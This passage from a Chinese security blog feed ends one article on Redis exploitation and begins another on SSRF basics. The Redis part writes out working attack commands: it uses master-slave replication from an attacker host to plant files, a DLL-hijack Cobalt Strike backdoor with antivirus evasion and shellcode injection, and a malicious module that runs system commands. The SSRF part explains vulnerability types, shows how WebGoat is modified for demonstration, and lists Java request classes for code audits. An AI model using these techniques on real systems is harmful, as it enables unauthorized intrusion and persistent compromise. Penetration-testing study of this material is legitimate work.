src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6e1b28cea83b9a7b8e6d7da489374659.png"><br>执行脚本同步：</p><pre class="line-numbers language-cmd"><code class="language-cmd">python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "C:/Users/Public/Desktop" --rfile "Google Chrome.lnk" --lfile "Google Chrome.lnk"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/093ab56ed159388b827b9b47d7f641b7.gif"></p><p><em>快速启动栏</em><br>在文件夹<code>%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar</code>中，可以修改，但是测试新增文件并不会在任务栏显示。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/af92092b9edcc756437a953dc0962cdc.png"></p><p><em>DLL劫持</em><br>开启Process Monitor监控，然后启动Redis，观察到Redis在其安装目录加载了<code>dbghelp.dll</code>和<code>CRYPTBASE.DLL</code>两个DLL,这两个DLL本来是在系统目录中的，加载过程中存在了DLL加载顺序的劫持（DLL劫持相关基础可以查看<a href="http://xxxxxx/">DLL劫持漏洞</a>）：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c698ca3d8fc6bf984232694d40a3e131.png"><br>利用之前查看进程的架构，利用的DLL也需要是相同架构：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2cb69eba140ae0b8ab41cb68f923aad4.png"><br>生成Cobalt Strike的x64 DLL后，直接使用NetClone工具复制出DLL的导出函数进行代理转发：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/7edb112f6328ef400d794b77fe73d4df.png"><br>生成完成后查看DLL架构x64为8664，x86为014C(用记事本打开二进制文件查看字符串64位是<code>PE  d†</code>，32 位是<code>PE L</code>):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9956b741c13fd911842ef7a119dad9c8.png"></p><p>参考 <a href="https://xz.aliyun.com/t/8153?page=3">Redis on Windows 出网利用探索</a> 一文中，DLL劫持还可以由 <code>BGSAVE</code>等命令触发。使用 <a href="https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie">Brownie</a>来进行DLL的免杀，<a href="https://github.com/monoxgas/Koppeling">Koppeling</a> 项目来快速进行DLL函数代理转发构建：<br>1.生成Cobalt Strike后门：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8b422092ae816be1b087546e7cab5b0b.png"><br>2.使用Brownie项目中的AES.py脚本加密Bin输出logo.png：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5a54ed94e9bbf0458596813450794f48.png"><br>3.在Brownie中配置与加密脚本中一致的AES-KEY。<br>4.DLL中使用<code>CreateProcess</code>和<code>CreateRemoteThread</code>API组合注入shellcode:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/84a5e8c8215a8c38f5104335ef0cd689.png"><br>5.生成项目DLL后使用Koppeling项目中的Python脚本来链接到转发DLL:</p><pre class="line-numbers language-python"><code class="language-python">python3 PyClone<span class="token punctuation">.</span>py AES<span class="token punctuation">.</span>dll C<span class="token punctuation">:</span>\windows\system32\dbghelp<span class="token punctuation">.</span>dll <span class="token operator">-</span>o dbghelp<span class="token punctuation">.</span>dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e4db3f27a21559bd617154e98f92969c.png"><br>6.使用Redis主从同步脚本写入后执行<code>bgsave</code>触发DLL劫持：</p><pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.97</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.138</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"D:/phpstudy_pro/Extensions/redis3.0.504"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile <span class="token string">"dbghelp.dll"</span> <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token string">"dbghelp.dll"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/188376a7149dc5dbc46e0a67415437cc.gif"></p><h3 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h3><p>在Redis4.0或更高版本中，支持了自定义<a href="https://redis.io/modules">模块</a>，可以编写模块来执行命令，GitHub项目<a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>。<br>利用主从复制写入文件后使用<code>module load xx.so</code>加载，通过模块扩展进行命令执行等操作，类似MySQL的UDF。操作命令如下:</p><pre class="line-numbers language-cmd"><code class="language-cmd">config set dir /tmpconfig set dbfilename system.soslaveof 192.168.11.1 16379  module load /tmp/exp.soslaveof no one system.exec 'id'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用RedisWriteFile脚本增加自动命令执行：</p><pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"/tmp"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile system<span class="token punctuation">.</span>so <span class="token operator">-</span><span class="token operator">-</span>lfile system<span class="token punctuation">.</span>so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/80a9d6fc69b3481dcf76d78ab3e90615.png"></p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br><a href="https://www.secpulse.com/archives/5366.html">https://www.secpulse.com/archives/5366.html</a><br><a href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a><br><a href="https://jkme.github.io/redis-on-windows-dll-hijack.html">https://jkme.github.io/redis-on-windows-dll-hijack.html</a><br><a href="https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/">https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞基础</title>
      <link href="/2021/10/07/ssrf-lou-dong-ji-chu/"/>
      <url>/2021/10/07/ssrf-lou-dong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>SSRF(Server-side request forgery，服务端跨站请求伪造)是一种 Web 安全漏洞，允许攻击者诱导服务器端应用程序向攻击者选择的任意域发出 HTTP 请求。攻击可强制让服务器链接到任意内部或者外部的其他主机，从而可能泄露服务器敏感信息或者对其他主机发起恶意请求。常见的利用方式可以探测内部网络部署的服务信息、端口开放情况，攻击一些内部的服务等。本文对SSRF的类型、协议支持、可能的产生的漏洞代码、相关利用工具进行分析整理，完善SSRF漏洞的理解和利用。</p><h2 id="0x02-SSRF的类型"><a href="#0x02-SSRF的类型" class="headerlink" title="0x02 SSRF的类型"></a>0x02 SSRF的类型</h2><p>根据SSRF请求后的返回情况来看，利用SSRF可以分为三种情况：<br>1.回显SSRF<br>2.侧信息SSRF(时间延时、返回状态码等)<br>3.盲SSRF(完全没有回显或其他侧信息)</p><p>一般来说，完全回显的SSRF可以直观的看到SSRF产生的效果，比如很快得知内部的一些系统框架版本等信息；部分回显可能只有一些响应状态码等侧信息来判断内部网络情况；盲SSRF这种由于返回数据包中看不出来效果就只有尝试数据带外等利用方式了。</p><h3 id="回显SSRF"><a href="#回显SSRF" class="headerlink" title="回显SSRF"></a>回显SSRF</h3><p>有回显的SSRF是说在漏洞触发后，可以将服务器请求后的详细源码信息内容返回。以Webgoat靶场中的SSRF模块来分析，在IDEA中查看JAVA代码，其使用了<code>java.net.URL</code>类对外部发起请求，其关键源码和请求数据包如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">(</span>InputStream in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// Otherwise the \n gets escaped in the response</span>     html <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">getFailedResult</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//in case the external site is down, the test and lesson should still be ok</span>     html <span class="token operator">=</span> <span class="token string">"&lt;html>&lt;body>Although the http://ifconfig.pro site is down, you still managed to solve"</span> <span class="token operator">+</span> <span class="token string">" this exercise the right way!&lt;/body>&lt;/html>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/a6ed362e91cf27c7d26794eff3b3b5f9.png"><br>代码中对输入的URL进行限定，只允许其为<code>http://ifconfig.pro</code>，这里为了显示其他效果，将代码中的字符串匹配逻辑修改可以任意URL请求，将<code>matches</code>匹配空字符串并对判断取反：</p><pre class="line-numbers language-java"><code class="language-java"> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String html<span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">(</span>InputStream in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>             <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/c31883f7c5cd86caeac98a046f8fba9c.png"><br>这样一来就可以使用其他URL测试效果了，在靶场中找到触发位置拦截数据包，将URL修改成<code>http://www.baidu.com</code>,响应中看到获取了baidu.com的网页源码：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/859117ad8f942e9c9614755b8d9d282a.png"><br>所以这里就是一个完全回显的SSRF漏洞，提交的URL参数在服务器上使用<code>java.net.URL</code>类去发起请求，然后打开URL保存二进制流<code>InputStream in = new URL(url).openStream()</code>，最后将结果处理后返回给前端。所以在这个漏洞点关注的就是<code>java.net.URL</code>类使用时是否对请求的地址进行了限制。</p><h3 id="侧信息SSRF"><a href="#侧信息SSRF" class="headerlink" title="侧信息SSRF"></a>侧信息SSRF</h3><p>这种类型因为在后端进行了相应处理，无法获得完整的响应源码，只能通过后端返回状态码，请求响应延时等来判断利用结果。像上面的Demo可以修改一下模拟这个场景，成功请求返回1,失败返回0：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/42a8696419d732b3b0ad462bf4fc39e0.png"><br>请求不存在的域名导致失败，输出位置返回0：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/abf886d74a0893cdd0e2a8109859b9de.png"></p><h3 id="盲SSRF"><a href="#盲SSRF" class="headerlink" title="盲SSRF"></a>盲SSRF</h3><p>这一类就完全没有回显和侧信息来泄露SSRF利用结果，一般的可以通过带外来观察是否存在漏洞，如下使用端口监听方法，VPS上开启端口监听，在可能存在漏洞的位置写入VPS的监听地址:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/13e263257c37f10c3bff1c1de2c5d71a.png"></p><p>这样就在vps上观察到了来自服务器的请求。也可以使用<a href="http://www.dnslog.cn/">DNSLOG</a>判断：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/d5613fa8b577a0f3f381a5587aca2a26.png"></p><h2 id="0x03-SSRF漏洞挖掘与代码审计"><a href="#0x03-SSRF漏洞挖掘与代码审计" class="headerlink" title="0x03 SSRF漏洞挖掘与代码审计"></a>0x03 SSRF漏洞挖掘与代码审计</h2><h3 id="常见漏洞场景"><a href="#常见漏洞场景" class="headerlink" title="常见漏洞场景"></a>常见漏洞场景</h3><p>SSRF漏洞产生的原因是在一些需要服务器发起请求来获取数据的情况下，代码层面没有做好限制，导致传入的地址用户可控，那么就会产生漏洞。黑盒挖掘的情况下，可以留意下列可能的场景：</p><ul><li>带有URL的参数传递</li><li>参数中的图片地址</li><li>端口开放情况检测</li><li>数据库链接检测</li><li>代码仓库的clone</li><li>远程文件内容获取</li><li>远程图片获取</li><li>后台状态刷新</li><li>web hook消息同步</li><li>…</li></ul><p>关注一些可能使用远程地址的功能、带有URL等关键字的参数、带远程地址的参数值等。如在gitlab中有一个从URL导入仓库的功能：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/0ec1e56a23d6a2fb3e5ce9e29b0416db.png"><br>抓包修改参数中的import_url即可发起对其他服务器的访问(这里使用了IPV6地址绕过限制进行服务器本地SSRF)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/83b72ca9a2d7ec60bd35d3af430e079d.png"><br>另外一个案例是在获取远程图片功能中，本来是只允许特定域名，但是这里未进行限制，修改地址为DNSLOG后成功收到请求：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/4d1b17f0c2abdcd20aae6786539b22a5.png"></p><h3 id="JAVA中的SSRF"><a href="#JAVA中的SSRF" class="headerlink" title="JAVA中的SSRF"></a>JAVA中的SSRF</h3><p> 产生上述问题的原因都是在代码层面没有对传入的地址进行严格限制。在JAVA代码审计中，不仅要关注可能对外发起请求的类调用，也要关注一些限制措施是否存在绕过的可能，在手工审计过程中通过功能点审计一些常见的外部请求类和第三方包的使用代码，进而分析是否存在漏洞：</p><p><em>java.net.URL</em><br>如下webgoat靶场SSRF中的代码，使用URL类中<code>openStream()</code>打开远程链接的数据流：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span> InputStream in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><em>java.net.URLConnection</em><br>URL类的openConnection方法：</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">import java.net.URLConnection;...URLConnection urlConnection = new URL(url).openConnection();   ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><em>java.net.HttpURLConnection</em></p><pre class="line-numbers language-JAVA"><code class="language-JAVA">import java.net.HttpURLConnection;URL requrl = new URL(url);HttpURLConnection con = (HttpURLConnection) requrl.openConnection();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <em>java.net.http</em><br>在JDK11后开始自带，由JDK9的<code>jdk.incubator.http</code>迁移而来：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpClient<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpRequest<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpResponse<span class="token punctuation">;</span> HttpClient client <span class="token operator">=</span> HttpClient<span class="token punctuation">.</span><span class="token function">newHttpClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                HttpRequest request <span class="token operator">=</span> HttpRequest<span class="token punctuation">.</span><span class="token function">newBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">uri</span><span class="token punctuation">(</span>                                java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URI<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token string">"http://foo.com/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                client<span class="token punctuation">.</span><span class="token function">sendAsync</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> HttpResponse<span class="token punctuation">.</span>BodyHandlers<span class="token punctuation">.</span><span class="token function">ofString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">thenApply</span><span class="token punctuation">(</span>HttpResponse<span class="token operator">:</span><span class="token operator">:</span>body<span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">thenAccept</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>out<span class="token operator">:</span><span class="token operator">:</span>println<span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>Apache HttpComponents</em></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">(</span>CloseableHttpClient httpclient <span class="token operator">=</span> HttpClients<span class="token punctuation">.</span><span class="token function">createDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span>httpclient<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>HttpPost httpPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpPost</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>okhttp</em><br><a href="https://square.github.io/okhttp/">OkHttp</a>是一个 Java 的 HTTP+SPDY 客户端开发包，同时也支持 Android，由Square 公司开源贡献。示例代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> okhttp3<span class="token punctuation">.</span>guide<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> okhttp3<span class="token punctuation">.</span>OkHttpClient<span class="token punctuation">;</span><span class="token keyword">import</span> okhttp3<span class="token punctuation">.</span>Request<span class="token punctuation">;</span><span class="token keyword">import</span> okhttp3<span class="token punctuation">.</span>Response<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetExample</span> <span class="token punctuation">{</span>  <span class="token keyword">final</span> OkHttpClient client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OkHttpClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  String <span class="token function">run</span><span class="token punctuation">(</span>String url<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    Request request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">(</span>Response response <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    GetExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GetExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String response <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">"https://raw.github.com/square/okhttp/master/README.md"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>Retrofit</em><br>Retrofit 是 Square 公司出品的默认基于 OkHttp 封装的一套 RESTful 网络请求框架，适用于 Android 和 Java 的类型安全HTTP 客户端，示例代码：</p><pre class="line-numbers language-java"><code class="language-java">Retrofit retrofit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Retrofit<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">baseUrl</span><span class="token punctuation">(</span><span class="token string">"https://api.github.com/"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">addConverterFactory</span><span class="token punctuation">(</span>GsonConverterFactory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>GitHubService service <span class="token operator">=</span> retrofit<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>GitHubService<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>RestTemplate</em><br><a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/client/RestTemplate.html">RestTemplate</a>是Spring用于同步客户端HTTP访问的中心类，遵循RESTful规范，简化了与 HTTP 服务器的通信。</p><pre class="line-numbers language-java"><code class="language-java">RestTemplate restTemplate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RestTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResponseBean responseBean <span class="token operator">=</span> restTemplate<span class="token punctuation">.</span><span class="token function">postForObject</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> requestBean<span class="token punctuation">,</span> ResponseBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><em>OpenFeign</em><br><a href="https://github.com/OpenFeign/feign">OpenFeign</a>是一个声明式WebService客户端，其工作原理是将注释处理成模板化的请求，通过占位符{id}来简化API的处理,示例代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">interface</span> <span class="token class-name">Bank</span> <span class="token punctuation">{</span>  <span class="token annotation punctuation">@RequestLine</span><span class="token punctuation">(</span><span class="token string">"POST /account/{id}"</span><span class="token punctuation">)</span>  Account <span class="token function">getAccountInfo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> String id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BankService</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Bank bank <span class="token operator">=</span> Feign<span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">decoder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AccountDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Request<span class="token punctuation">.</span>Options</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">target</span><span class="token punctuation">(</span>Bank<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"https://api.examplebank.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PHP中的SSRF"><a href="#PHP中的SSRF" class="headerlink" 